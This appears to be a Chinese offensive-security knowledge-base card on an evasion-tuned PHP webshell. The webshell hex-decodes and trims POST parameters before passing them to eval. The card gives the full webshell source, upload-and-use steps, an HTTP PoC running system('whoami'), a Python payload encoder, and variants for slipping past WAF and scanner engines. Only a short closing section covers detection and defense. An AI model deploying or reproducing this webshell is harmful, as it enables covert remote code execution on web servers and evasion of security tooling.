---
id: web-php-rce-webshell-pack-hex-substr-param-encode
title: 参数变换型 PHP 免杀马：base64(num) 往返 + substr 掐头去尾 + pack('H*') 解码后 eval
type: scenario
domain: web
path: web/php/rce
technique: pack-hex-substr-param-encode-webshell
tags:
- php
- webshell
- evasion
- waf-bypass
- pack
- substr
- base64
- eval
- parameter-obfuscation
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-12'
verification:
  verified_by: verifier-V556
  verified_at: '2026-11-12T00:21:01+08:00'
  notes: 已对照原文全文与20张截图核对：Car::encode 的 base64_encode/base64_decode 空往返、foreach 遍历 $_POST 对每个参数 substr($v,$num,-$num) 掐头去尾后 pack('H*') 解码、再 base64 往返 return 给 eval（图16 标注第一/二/三步）；PoC num=2&Qxi*37yz=6173797374656d282777686f616d6927293b62 与图17 原文请求逐字一致，响应 cmd.exe 回显 whoami（laptop-o0rkdo96\12816）与图15 十六进制转换过程吻合；D盾为图13（检测文件数1、可疑文件0）、微步 WHITE 为图14，原稿图号误写为图14/检出文件数0，已修正 KB 与 staging 正文。影响版本不适用（免杀手法卡，非组件漏洞），未设 affected_versions 正确。dedup 候选 class-array-map/0o0o/doccomment 等均为不同载体/不同管道，非同一链；dup-scan 无相关 pair。PoC 未在本机执行。
url: /docs/web/php/rce/web-php-rce-webshell-pack-hex-substr-param-encode/
draft: false
kb_aliases:
- Car encode 免杀马
- pack H* 免杀 WebShell
- substr 掐头去尾参数马
- 十六进制参数免杀
- Qxi*37yz 马
---

## 一句话结论

用类 `Car` 的 `encode()` 对每个 POST 参数做「`substr($v, $num, -$num)` 掐掉首尾各 `$num` 个字符 → `pack('H*')` 十六进制解码」，再把处理后的参数 `base64_encode`/`base64_decode` 往返一次交给 `eval`；源码里没有 `system`/`assert` 等敏感函数名，也没有 `eval($_POST[...])` 的直接形态，命令以十六进制串形式放在自定义参数里（首尾用任意字符填充），可绕过基于关键字/正则的 WebShell 查杀。

## 原理

- 木马结构：
  ```php
  class Car {
      function encode() {
          $num1 = base64_encode($_POST['num']);
          $num   = base64_decode($num1);       // 自编码再解码，仅为伪装
          foreach ($_POST as $k => $v) {
              $_POST[$k] = pack('H*', substr($v, $num, -$num));
          }
          $post  = base64_encode($_POST['Qxi*37yz']);
          $post1 = base64_decode($post);
          return $post1;
      }
      function Xt() { return eval($this->encode()); }
  }
  $t = new Car; $t->Xt();
  ```
- 数据流：`$num` 决定去掉首尾多少个填充字符；`substr($v, $num, -$num)` 取中间段；`pack('H*', ...)` 把十六进制文本还原为原始 PHP 代码；`eval` 执行。
- 为什么能免杀：
  - 文件里没有任何危险命令函数名，唯一的高危点是 `eval`，但它接收的是经过多层计算的返回值，不是可从请求直接追踪到的 `$_POST` 变量；
  - 参数名 `Qxi*37yz` 需要 URL 编码/原样发送，静态规则难以把它与"执行"关联；
  - 真正的 payload 是十六进制串，且首尾带 `$num` 个任意填充字符（示例用 `a...b`），按纯文本特征扫描看不到 `system(` 或命令；
  - `base64_encode` → `base64_decode` 的往返是无意义的等价变换，用来干扰基于污点传播/简单语义分析的引擎。
- 参数计算（示例 `num=2`）：
  - 原始 `Qxi*37yz = 61 73 79 73 74 65 6d 28 27 77 68 6f 61 6d 69 27 29 3b 62`（首 `a` 尾 `b` 是填充）；
  - `substr(...,2,-2)` 得到 `73797374656d282777686f616d6927293b`；
  - `pack('H*', ...)` → `system('whoami');`；
  - `eval` 执行，命令输出回显。
- 原文用该马通过了 D 盾（图 13 显示检测文件数 1、发现可疑文件 0）、微步沙箱（图 14 显示 WHITE）等测试；该结论属原文自述，检测引擎版本不同结果可能变化。
- 该马也能被蚁剑等客户端连接，只需按上述规则编写编码器（把要执行的 PHP 代码转十六进制并加填充）。

## 触发条件

- 目标存在文件写入/上传落点，能把这段 PHP 投放为可访问脚本（WebShell 免杀是投放后的规避层，不是独立入口漏洞）。
- PHP 版本支持 `pack`、`substr` 与类语法（PHP 5/7 均可）。
- 攻击者能按同一变换规则构造请求（或使用配套编码器）。

## 利用步骤

1. 将上述 `Car` 类代码保存为 `new.php`，通过上传/写入漏洞落到 Web 目录。
2. 构造要执行的 PHP 代码，如 `system('whoami');`，转成十六进制串。
3. 在十六进制串首尾各加 `$num` 个任意字符（示例 `num=2`，首尾各加 2 个字符）。
4. POST 到 `new.php`：`num=2&Qxi*37yz=<填充+十六进制+填充>`。
5. 服务端 `encode()` 完成截取、十六进制解码与 eval，命令输出出现在响应中。
6. 需要交互式管理时，按相同规则给蚁剑/哥斯拉写编码器。

## PoC

```http
POST /new.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

num=2&Qxi*37yz=6173797374656d282777686f616d6927293b62
```

```text
# 参数值拆解：
#   61 73 ... 3b 62          -> 原始十六进制串首尾各加 'a'、'b' 两个填充字符
#   substr(value, 2, -2)      -> 73797374656d282777686f616d6927293b
#   pack("H*", ...)           -> system('whoami');
#   eval(...)                 -> 执行命令并回显当前用户
```

```python
# 一键生成参数（按原文思路整理，未在目标上执行）
num = 2
php_code = "system('whoami');"
hex_code = php_code.encode().hex()
print({'num': num, 'Qxi*37yz': 'a' * num + hex_code + 'b' * num})
```

## 变体与关联

- 变体：把 `pack('H*')` 换成 `hex2bin`、`base64_decode`、`gzinflate` 等解码函数，或把填充字符改为随机值并把 `$num` 也做变换。
- 变体：自定义参数名、把 `eval` 换成 assert（PHP5）/回调函数，或把 `encode()` 的返回再经一次异或。
- 关联：[[web-php-rce-upload-chr-ascii-webshell-waf-bypass]]（chr 拼接函数名的 ASCII 马）、[[web-php-rce-webshell-xor-encoded-function-name]]（异或拼函数名）、[[web-php-rce-webshell-callback-wrapper-variable-function-regex-bypass]]（动态调用形态绕过语法正则）；本卡的不同点是把**参数值本身**做截取+十六进制解码，再配合 eval，重点在参数管道而非函数名。
- 关联：[[web-php-rce-godzilla-aes-session-webshell-disguise]]（另一类加密流量马；本卡是文件+参数编码型）。

## 检测与防御

- 检测：审计上传/写入的 PHP 文件中对 `pack('H*'`、`substr($v, $num, -$num)`、`base64_encode`/`base64_decode` 往返、`eval($this->...)` 的组合；关注类方法内 `foreach($_POST)` 改写超全局变量的模式。
- 检测：对上传目录做文件完整性/内容扫描，不只看关键字，结合 AST 语义与污点传播（`$_POST` → `pack` → `eval` 的数据流）。
- 防御：上传目录禁止脚本执行；文件上传做扩展名、内容与重命名多重校验；部署 RASP 在 `eval`/动态调用层做运行时拦截。
- 防御：WebShell 查杀需多引擎组合（静态特征 + AST + 沙箱），单一关键字/正则规则容易被此类等价变换绕过。
